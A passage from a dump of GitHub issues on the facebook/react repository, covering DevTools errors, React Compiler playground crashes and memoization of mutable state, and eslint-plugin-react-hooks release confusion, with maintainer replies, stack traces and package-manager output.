(6/21/2021)\r\nReact: 17.0.2\r\nReactDOM: 17.0.2\r\n\r\n`@storybook/components@5.3.21` is installing React/ReactDOM 16 too, although nothing storybook related should end up on the main app bundle.\r\n\r\nChrome doesn't provide much info on `chrome://extensions` nor a way to export exceptions / stack traces, but if anything here is useful, let me know and I'll share more about it.\r\n\r\n<img width=\"724\" alt=\"image\" src=\"https://user-images.githubusercontent.com/1285131/158870618-1b761dca-95c9-4220-9595-e06f775f11c2.png\">\r\n"}, {"author": "bvaughn", "body": "> * React DevTools: 4.13.5 (6/21/2021)\r\n\r\n@mrkev Why are you using a year old version of DevTools? :)"}, {"author": "mrkev", "body": "No idea, and the completely fell under my radar haha let me re-install\r\n\r\nEDIT: would you look at that, things are working for me again. I'm off to some profiling!"}, {"author": "RobIsHere", "body": "Just checked: my devtools are up to date and I'm seeing the bug. I'm not using any forms libraries but wired it up manually, so formik or whatever like suggested above is probably not the reason. I also tried to create a stripped down app for reproducing this bug, but could not successfully reproduce it.\r\nThe very special thing with the app where I'm seeing the bug is that I'm using two different react apps on the same page, one compiled as library and loaded and started inside of the other. Maybe this scenario is not supported?"}, {"author": "lunaruan", "body": "@RobIsHere Hey! This scenario should be supported, though since it's not common there might be an issue with it. Did you try reproducing the bug with the two different react apps? To create a repro case, I would recommend removing chunks of your app until you get a small repro that still shows the bug."}, {"author": "evangrim", "body": "I got this error using react-devtools 4.24.1.\r\n\r\nReinstalling npm install react-devtools@4.2 solved my issue. (Also possible a fresh install helped.)\r\n\r\nAlso FWIW with 4.24.1, I had an issue where react-devtools loaded and seemed to connect but no components displayed (filters were removed). "}, {"author": "moisesrj97", "body": "I am having the same issue when trying to switch the component rendered inside a Suspense.\r\n\r\nreact-devtools version: [4.24.3-46a98cff2](https://github.com/facebook/react/blob/main/packages/react-devtools/CHANGELOG.md#4243)\r\n\r\nDemo: https://codesandbox.io/s/amazing-blackburn-k2iql8?file=/src/App.js"}, {"author": "shamilovtim", "body": "Edit: see follow up below"}, {"author": "shamilovtim", "body": "UPDATE: See comment below for full fix and information.\r\n\r\nHello @lunaruan @bvaughn sorry for the tag but I thought I'd comment that I've isolated this issue to a specific DevTools release where it got introduced: between ~~4.13.0...4.13.1~~~  4.7.0 and 4.8.0 (UPDATE: See comment below,) I'll list our stack and see attached screengrabs for evidence.\r\n\r\n\r\nENV INFO:\r\n`node` is `v14.17.3` installed with nvm at `/Users/admin/.nvm/versions/node/v14.17.3/bin/node` \r\n`npm 8.5.5` installed at `/Users/admin/.nvm/versions/node/v14.17.3/bin/npm` \r\n`react: 17.0.2`\r\n`react-native: 0.65.2` which depends transitively on `react-dev-tools-core@^4.6.0` and resolved at `\"4.13.5\"`\r\n`react-dev-tools`: installed with `yarn global add react-devtools@4.7.0` at `/usr/local/bin/react-devtools`, which incrementing to `4.8.0` will consistently reproduce errors\r\n\r\n\r\nRegarding what I've tried. I've tried unlocking the local transitive to latest (4.24.4 or whatever) and installing global 4.24.4. This reproduces the node 161 error message. I've tried almost every version over 4.7.0 and all of them throw errors. I've tried installing those latest versions with `npm -g` instead of yarn and it didn't help. I've tried using latest react-devtools with node v16 as well as node v13, with react-devtools installed globally inside of each of those particular node versions and that didn't help either.\r\n\r\nMy conclusion is that despite react-native `0.65.2` specifying a transitive `^4.6.0` the reality is that it only supports `4.7.0` and lower. Given that this is an older version of RN, I doubt that they're going to make a patch release to fix this. So perhaps the ball is in the DevTools team's court to make react devtools > 4.7.0 backwards compatible? \r\n\r\nThanks for reading!"}, {"author": "bvaughn", "body": "Thanks for the follow up info. I suspect 4.13.1 is maybe a bad lead though, in terms of when the bug was \"introduced\"\u00a0\u2013 because that version included #21426 (which basically made DevTools stop silently swallowing certain types of Store errors). In other words, 4.13.0 (and older) were probably also broken but in a less obvious way."}, {"author": "shamilovtim", "body": "You're right @bvaughn it was just swallowing the error and neither the profiler tab nor the component tab were working. I've now isolated to no errors whatsoever. I did it by locking react native's transitive `react-devtools-core` to `4.7.0` (rather than ^4.6.0) and installed global devtools with `yarn global add react-devtools@4.7.0.` The break happens between `react-devtools` 4.7.0...4.8.0. I suspect React Native has not locked to the correct transitive version, which is why you guys can't reproduce this. They just need to remove the `^` from their transitive dependency on react-devtools-core in package.json. For backwards compat the fix is probably between those two versions. I'll update my previous comment to point here.\r\n\r\n4.7.0 success, both components and profiler working:\r\n<img width=\"1500\" alt=\"Screen Shot 2022-04-19 at 8 52 58 PM\" src=\"https://user-images.githubusercontent.com/3495974/164125518-13ac42f2-f501-4669-a442-144a693783c8.png\">\r\n"}, {"author": "bvaughn", "body": "Interesting! Nice sleuthing.\r\n\r\nThings broke in version 4.8? \ud83d\ude2e  That release was very small:\r\nhttps://github.com/facebook/react/blob/main/packages/react-devtools/CHANGELOG.md#480"}, {"author": "lunaruan", "body": "@shamilovtim Wow nice find! I tried reproducing with my local React Native app on v4.8, but I couldn't reproduce the bug. Do you have a link to your app that I can take a look at to see if I can repro on my side?"}, {"author": "shamilovtim", "body": "> @shamilovtim Wow nice find! I tried reproducing with my local React Native app on v4.8, but I couldn't reproduce the bug. Do you have a link to your app that I can take a look at to see if I can repro on my side?\n\nAh sorry @lunaruan but Shipt is closed source. I wonder, did you test on the react native version that was experiencing this problem? We're on 0.65.x. I  assume this isn't worth hotfixing, you can probably just have this ticket serve as the solution for people still on older versions. "}, {"author": "kofkgoing", "body": "```\r\n\"react-devtools-core\": \"4.24.3\",\r\n...\r\n\"resolutions\": {\r\n  \"react-devtools-core\": \"4.24.3\"\r\n},\r\n```\r\n\r\nhttps://github.com/facebook/flipper/issues/3649?fbclid=IwAR3wycD10ojRA2v3alwuaNeykbVzjnfiYkqsqHJX5Fj6YKj_QK0TtR1Fm7M#issuecomment-1272444843"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 34622, "issue_url": "https://github.com/facebook/react/issues/34622", "issue_title": "[playground]: Syntax error crashes playground", "issue_author": "ianduvall", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAKgmDgMIQC2ADoQpjgBR0wR1gCURwAOsSJxCFIhE5giAXiLtJAOkGCiRGAhyxiLFaqIAeAHzAJXAL76A9Id3cA3ILMgANCBGY0eAOYoQeehAwOEQ4AJ50CHxEAAoANlBeeJgA8nT4okRmRGgcNEQA5ABGAIaFCLEAtHTxiZgV6sW4FSL0eLEIMJYAJngU+Q6YgiwCQpaWLXRtxemYALIQXQjIRPwgxbGxq45EYNO9nuQxNUmpMzx2LuAAFhAA7gCSzB2Y62AoaK8IZkA\n\n### Repro steps\n\nCreate a syntax error in the playground.\n\nFor example, paste the following code into the playground:\n\n```tsx\nfunction TestComponent(props) {\n  const oops = props.\n\n  return (\n    <>{oops}</>\n  );\n}\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nlatest\n\n### What version of React Compiler are you using?\n\nlatest", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "yorgie7", "body": "When I click on link above, got this result.\n\n<img width=\"1919\" height=\"790\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/034150d3-b1be-412d-8813-4d7dc066b629\" />"}, {"author": "gkiely", "body": "Some other examples, it seems like these are TODO's that are crashing the playground.\n\n```js\n// Todo: (BuildHIR::lowerExpression) Handle get functions in ObjectExpression\nconst C = () => {\n  const t = {\n    get val(){}\n  }\n  return <></>;\n}\n```\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhHCA7MAXABAYVwF5cAKASmID5dgAdDXXdLPPE+xp3AcwTwBuAQwA2FYAF8GTKVxj9YjADxUlAeioBuBrJAAaNJgBmASx4oQJgLYAHCDDYBPGwlq4ACiKg8TGAPI22CaYYLgSuEYwEFa4AOQARkLxCCIAtDZePhip8kJw2KnotiYiCDBqACYmOLHaGAyknExqakU2JUJBmACyEBUIyLh0IKIiwzq4YJ3Vpgihnt6+AV1Y5Jr64AAWEADuAJIY2GUYomAoRqcIEkA\n\n```js\n// Todo: Unexpected terminal kind `ternary` for optional test block\nconst Component = () => {\n  useEffect(() => {}, []);\n  const params = join({\n    a: true ? '' : undefined,\n    b: true ? '' : undefined,\n  })?.replaceAll('', '');\n}\n```\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhHCA7MAXABAYQgFsAHTBDPAXlwAoBKXKgPl2AB0NdcowEBRAGaCEcbLQZNWwAL4AaXAG0AuvQDcnbuix4SAQxh6iYJrgBWEAJYZaHLt1x7kubDCgJcAflwByH7mcoDAATBEFrBGC5TQcAI2dXdy9ff0CQsIiomJl6TwA6GAQSABs9RABBYuLaPwU-dU4ZEDk0THCAcxQQS1IIGDxsAE8SD2BcAAViqHbrAHkSbEtMExlcQRhiX1i9WIRigFoS6et9wrLsffRSS2KEGAB6YMscHw0MTlsY+-urkhu9RaYACyEFCznYID0VQhjVwYABz3CCBMk2OGHmgKw6ma4AAFhAAO4ASUodwwULAKEEFIQMiAA"}]}
{"repo": "facebook/react", "issue_number": 34132, "issue_url": "https://github.com/facebook/react/issues/34132", "issue_title": "[DevTools Bug]: The link that points to the master branch should point to the main branch instead", "issue_author": "adriancuadrado", "issue_body": "### Website or app\n\nhttps://chromewebstore.google.com/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?hl=en\n\n### Repro steps\n\n> This extension requires permissions to access the page's React tree, but it does not transmit any data remotely. It is fully open source, and you can find its source code at **https://github.com/facebook/react/tree/master/packages/react-devtools-extensions**.\n\nThe link to the source code points to the master branch but it should be the main branch because the master branch doesn't exist anymore. Not that it matters much since you get redirected to the main branch anyways but I thought it would be nice to point it out.\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n```text\n\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\n\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hoxyq", "body": "Thanks. Should be updated soon."}]}
{"repo": "facebook/react", "issue_number": 34317, "issue_url": "https://github.com/facebook/react/issues/34317", "issue_title": "[DevTools Bug] Failed to construct 'URL': Invalid base URL", "issue_author": "dharmasam", "issue_body": "### Website or app\n\nUncaught Error: Failed to construct 'URL': Invalid base URL\n\n### Repro steps\n\nJust clicking on the items in my component\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.5-5d87cd2244\n\n### Error message (automated)\n\nFailed to construct 'URL': Invalid base URL\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1433932\n```\n\n### Error component stack (automated)\n\n```text\nat ActualSourceButton (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1435264)\n    at Suspense (<anonymous>)\n    at Components_InspectedElementViewSourceButton (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1435715)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at InspectedElementWrapper (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1436226)\n    at va (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1380724)\n    at div (<anonymous>)\n    at InspectedElementErrorBoundaryWrapper (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1387058)\n    at NativeStyleContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1419824)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at OwnersListContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1329355)\n    at SettingsModalContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1363197)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1459944\n    at va (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1380724)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at ThemeProvider (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383435)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383632\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at ThemeProvider (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383435)\n    at InspectedElementContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1394502)\n    at TimelineContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1461901)\n    at ProfilerContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1453632)\n    at TreeContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1275115)\n    at SettingsContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1303162)\n    at ModalDialogContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1440740)\n    at DevTools_DevTools (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1612679)\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Failed to construct 'URL': Invalid base URL in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hoxyq", "body": "Should be fixed in v7."}]}
{"repo": "facebook/react", "issue_number": 34753, "issue_url": "https://github.com/facebook/react/issues/34753", "issue_title": "[DevTools Bug] Cannot read properties of undefined (reading 'local')", "issue_author": "mbrammer", "issue_body": "### Website or app\n\nprivate\n\n### Repro steps\n\nI clicked on \"Debug\" in the settings.\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.5-5d87cd2244\n\n### Error message (automated)\n\nCannot read properties of undefined (reading 'local')\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1622093\n    at Ce.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1203343)\n    at Ce.updateHookSettings (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1245654)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1449977\n    at commitHookEffectListMount (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:129190)\n    at commitPassiveMountOnFiber (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:160553)\n    at recursivelyTraversePassiveMountEffects (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:160187)\n    at commitPassiveMountOnFiber (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:160621)\n    at recursivelyTraversePassiveMountEffects (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:160187)\n    at commitPassiveMountOnFiber (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:160621)\n```\n\n### Error component stack (automated)\n\n```text\nat DebuggingSettings (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1449655)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at SettingsModalImpl (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1457841)\n    at SettingsModal_SettingsModal (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1457510)\n    at div (<anonymous>)\n    at SettingsModalContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1363197)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1604868\n    at va (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1380724)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at ThemeProvider (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383435)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383632\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at ThemeProvider (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383435)\n    at InspectedElementContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1394502)\n    at TimelineContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1461901)\n    at ProfilerContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1453632)\n    at TreeContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1275115)\n    at SettingsContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1303162)\n    at ModalDialogContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1440740)\n    at DevTools_DevTools (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1612679)\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot read properties of undefined (reading 'local') in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hoxyq", "body": "Closing as duplicate, let's follow up in https://github.com/facebook/react/issues/34711, please share there which browser are you using and its version."}]}
{"repo": "facebook/react", "issue_number": 34519, "issue_url": "https://github.com/facebook/react/issues/34519", "issue_title": "[Compiler] Reading external mutable state", "issue_author": "mecirt", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhHANgQzGABAFQTABddgAdAO11zgkpJijmIhgAoBKM3YgCwCWYAHQB9AG6Z0UIrgC8ZAL4BuXIqo0A5gmLsBAE24VqNXOh24YshfyFjJ0ogG0DAXWUbTAgGa52AQiswbiD5HgByYgQAD2Jw5Fxw8LUPExorYlhqINSadRMwHT19ABpeGOIjTxpzUgQw4ESo2Pjy2JTq3kERCSkZMBd9VzCEXLUqFSoqSRhykjDKBAB3AiJdTlSqGIAHNlJvKEoWAXpVkgBhCABbXcXKXUbFKpNyEChC3EoIXCuEK4hXmM6AxSE4oNt9JgomVvGxEABVCFQhDDBTvBAAZWIyPYxCYCA2nlquAMYQAjGNiQAjMJREjCbS6AyEkzEhDoMLsAA8hFiADEBOz9LgANYIACecnC3kF6H0ySwVPZUsIJAElE0uBlQuSDhkcmAVOEzWIilw9HOfEwGoQBvYBPkAD4eHTiMJCkzSrgEMbMDBGcI9QTVLD4AhEZCogFwZHg2ozQB6R0s9I6LJ+Ln6ATiR3AdmKLkJrM5lmTShTRbRXYwUj6BDeTBQdD7Q7HU4AWXFAEFttsuGRPBl0zy1pcbvQEPdcEnUvkQCU0PQZZoUCABOOa7xxdt6o0AArSTTqgDy22IJwYai1MGuiSpmCV6AAtNtD+qn1ZMCwn3QbgJzDARZCHEmyUOwxg0AmCa-ts-5Qhe7YQHWCSvFI6CvBMuBgPBYDange5+ueUhcgeUBHpQp7nvQYDJso87gHwEBLAAkvcCAwJQUhgCgDboIUihAA\n\n### Repro steps\n\nSee the playground above - if you remove \"use no memo\", the generated code caches away the calls to test.get(1) as it incorrectly thinks that it always returns the same thing, and as a result, the TextField doesn't get updated properly.\n\n\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.1\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.3", "issue_labels": ["Type: Question", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. Note that React requires that components and hooks are pure functions of props and state. Reading external mutable values \u2014 such as `test.get(..)` in your example \u2014 violates this requirement and can cause your component to update (or fail to update). The example code would also fail with standard memoization, eg `useMemo(() => test.get(id), [test, id])` would only update when `test` or `id` changes. In this way, you can think about the compiler as yet another tool for detecting places where you're violating the rules of React. \n\nIs there a specific library that you're using which encourages this pattern?"}, {"author": "mecirt", "body": "No library, no, this is a simplified version of our internal code that we are currently porting from class components to functional ones. I will note that this issue also occurs if you pass \"test\" as a prop - the compiler doesn't detect that calling test.set alters the value returned by test.get.\n"}, {"author": "josephsavona", "body": "Thanks for clarifying!\n\n> the compiler doesn't detect that calling test.set alters the value returned by test.get.\n\nYup, that\u2019s expected. In React, component props and hook arguments may not be mutated. The way to model this in React is to use state, and setState with a new value on change. "}, {"author": "mecirt", "body": "Well, it has worked perfectly fine until now (and it continues to work fine after you disable the compiler), and so I imagine that this is going to trip up a lot of projects. I was at least lucky in that my component was fairly small, debugging an error of this kind on something big might be quite a nightmare.\n\nI don't know how feasible it is, but such a major behavioral change really needs to show a warning at the very least, same as e.g. hooks show one if you try to use them in a class component."}, {"author": "marcocondrache", "body": "@mecirt React always expects components to be pure functions, which is a fundamental requirement. This is a constraint that the compiler respects. Just because it works doesn't mean it is correct. Implementing a warning to detect side effects in a function is not as straightforward as it may seem. \n\nhttps://react.dev/learn/keeping-components-pure"}, {"author": "0xShubhamSolanki", "body": "I agree with @marcocondrache that enforcing purity is core to React's model, and the compiler is essentially surfacing a latent issue in the code. That said, @mecirt makes a fair point about migration pains for larger codebases transitioning from class components, where side effects like this might have slipped through without immediate breakage.\nTo mitigate this, you could consider wrapping the mutable state in a React-friendly way, such as using a context provider with useState or useReducer to manage the test object's data. This ensures changes trigger proper re-renders without violating purity.  \nFor example (rough sketch):\n```jsx \n import { createContext, useContext, useState } from 'react';\n\nconst TestContext = createContext();\n\nfunction TestProvider({ children }) {\n  const [data, setData] = useState(new Map());\n\n  const get = (id) => data.get(id) || '';\n  const set = (id, val) => setData((prev) => new Map(prev).set(id, val));\n\n  return <TestContext.Provider value={{ get, set }}>{children}</TestContext.Provider>;\n}\n\n// In your component\nfunction MyComponent() {\n  const { get, set } = useContext(TestContext);\n  const value = get(1);\n\n  // ... rest of component\n}  `\n\nThis way, updates via set will cause re-renders where needed, and the compiler should handle it correctly. If this pattern is widespread in your codebase, auditing with eslint-plugin-react-compiler might help flag similar spots early.\nCurious if the team has plans for more diagnostics in the compiler for common anti-patterns like this?"}, {"author": "josephsavona", "body": "> Curious if the team has plans for more diagnostics in the compiler for common anti-patterns like this?\n\nWe already detest direct mutation of props, such as `props.key = \u2026` or `props.foo[\u2018bar\u2019] = \u2026`. We can\u2019t realistically check within arbitrary functions that you call during render - this is why from the earliest days of React we have stressed that props and state should be immutable. \n\nI\u2019m gonna close since there isn\u2019t really any additional action we take here. "}]}
{"repo": "facebook/react", "issue_number": 34647, "issue_url": "https://github.com/facebook/react/issues/34647", "issue_title": "[Compiler Bug]: Please fix `eslint-plugin-react-hooks`", "issue_author": "cpojer", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wApgrAGJNKCAMoJxjAL4BKfMAA6bfHFZgCMUvgC8+KGAQAlUvzpVK8gNyr8+HblhsAPEzqYo20nuA6SWXxcTkwEPWUQEjEESPxWAGEACzI6AHNw4H4EADcEOlxFPQA+JXsHdU0CXDIYDIIDXPzcADoauoRcOzUHJhJ8fnb6lujxMEUVHoqRGKkZXH5uGBgyThGYCABbQdrh0YRx23KK4N3OlpyySigEfXwAcnvuk9ly2Ve6YoAJaUoIfAA6jhKIRXAB6DxeXDFbofEAAGhAGjo0TSKBATE22DwwVCt2A+AACtc0h4APKYZiafBBEgbTYPABGZEZ0gAtJgSR42ToyIw2RosTEYGDCEwtE9VKpBOUwWDBZgxGQqXR2BBiMh8JErpRIqogmBleLogcibVmFdXMSoKS6BSVWBirYEeAkhAAO4ASQKCBgdCuYBQ5EoxlkQA\n\n### Repro steps\n\nBack in April, [it was announced](https://react.dev/blog/2025/04/21/react-compiler-rc) that `eslint-plugin-react-compiler` was merged into `eslint-plugin-react-hooks`. Since then, `eslint-plugin-react-hooks` has been in a state of confusion:\n\n* The version tagged as \"latest\" on npm is still `5.2.0`, which is incompatible with ESLint v9.\n* The version tagged as \"rc\" is `6.0.0-rc.2`. `6.0.0` was published (accidentally?) and is in a broken state, and is deprecated with `This stable release was published by accident, please use 6.0.0-rc.1 instead.`. The problem is that package managers will tell you to install `6.0.0` because it considered as newer than any rc version. This is frustrating as people might accidentally \"upgrade\" to the deprecated version when they update their deps.\n* Since April various versions of the plugin have been released tagged as \"next\" and \"canary\", but not all of them contain the `react-hooks/react-compiler` rule. For example, [`@nkzw/eslint-config`](https://github.com/nkzw-tech/eslint-config) currently uses `6.1.0-canary-914319ae-20250423` which has the compiler rules, and the latest canary [`6.1.0-canary-df38ac9a-20250926`](https://www.npmjs.com/package/eslint-plugin-react-hooks/v/6.1.0-canary-df38ac9a-20250926?activeTab=code) have them too, but the last time I checked about two weeks ago, the canaries didn't have it.\n* In some of the newer canary versions, [this code was failing](https://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wApgrAGJNKCAMoJxjAL4BKfMAA6bfHFZgCMUvgC8+KGAQAlUvzpVK8gNyr8+HblhsAPEzqYo20nuA6SWXxcTkwEPWUQEjEESPxWAGEACzI6AHNw4H4EADcEOlxFPQA+JXsHdU0CXDIYDIIDXPzcADoauoRcOzUHJhJ8fnb6lujxMEUVHoqRGKkZXH5uGBgyThGYCABbQdrh0YRx23KK4N3OlpyySigEfXwAcnvuk9ly2Ve6YoAJaUoIfAA6jhKIRXAB6DxeXDFbofEAAGhAGjo0TSKBATE22DwwVCt2A+AACtc0h4APKYZiafBBEgbTYPABGZEZ0gAtJgSR42ToyIw2RosTEYGDCEwtE9VKpBOUwWDBZgxGQqXR2BBiMh8JErpRIqogmBleLogcibVmFdXMSoKS6BSVWBirYEeAkhAAO4ASQKCBgdCuYBQ5EoxlkQA). Not sure if it's still the same in the actual \"latest\" version or this was an intermittent bug.\n\n### Suggested Solution\n\nPlease publish `6.1.0`, `6.2.0` or `7.0.0` with the React Compiler rules and tag the release as latest \ud83d\ude47\u200d\u2642\ufe0f\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nlatest\n\n### What version of React Compiler are you using?\n\nlatest (?)", "issue_labels": ["Type: Bug", "Component: React Compiler"], "comments": [{"author": "poteto", "body": "Thanks for flagging! That seems like a bug if your package manager is resolving the `rc` tag to a deprecated version. What are you using? I just tested this with both npm and yarn:\n\n```\n$ yarn add eslint-plugin-react-hooks@rc --dev\n\nyarn add v1.22.22\n[1/5] \ud83d\udd0d  Validating package.json...\n[2/5] \ud83d\udd0d  Resolving packages...\n[3/5] \ud83d\ude9a  Fetching packages...\n[4/5] \ud83d\udd17  Linking dependencies...\n[5/5] \ud83d\udd28  Building fresh packages...\nsuccess Saved lockfile.\nsuccess Saved 1 new dependency.\ninfo Direct dependencies\n\u2514\u2500 eslint-plugin-react-hooks@6.0.0-rc.2\ninfo All dependencies\n\u2514\u2500 eslint-plugin-react-hooks@6.0.0-rc.2\n\u2728  Done in 4.93s.\n```\n\n```\n$ npm install eslint-plugin-react-hooks@rc --save-dev\n$ cat package.json\n\n{\n  \"name\": \"foobar\",\n  \"version\": \"1.0.0\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"description\": \"\",\n  \"devDependencies\": {\n    \"eslint-plugin-react-hooks\": \"^6.0.0-rc.2\"\n  }\n}\n```\n\nIn any case, we will be cutting a new RC tomorrow, I'll ping you when that's done.\n\n> Since April various versions of the plugin have been released tagged as \"next\" and \"canary\", but not all of them contain the react-hooks/react-compiler rule. For example, [@nkzw/eslint-config](https://github.com/nkzw-tech/eslint-config) currently uses 6.1.0-canary-914319ae-20250423 which has the compiler rules, and the latest canary [6.1.0-canary-df38ac9a-20250926](https://www.npmjs.com/package/eslint-plugin-react-hooks/v/6.1.0-canary-df38ac9a-20250926?activeTab=code) have them too, but the last time I checked about two weeks ago, the canaries didn't have it.\n\nWe'll write this up in the changelog, but we decomposed the monolithic `react-hooks/react-compiler` rule into specific rules ([now documented in react.dev](https://react.dev/reference/eslint-plugin-react-hooks)).\n\n> In some of the newer canary versions, [this code was 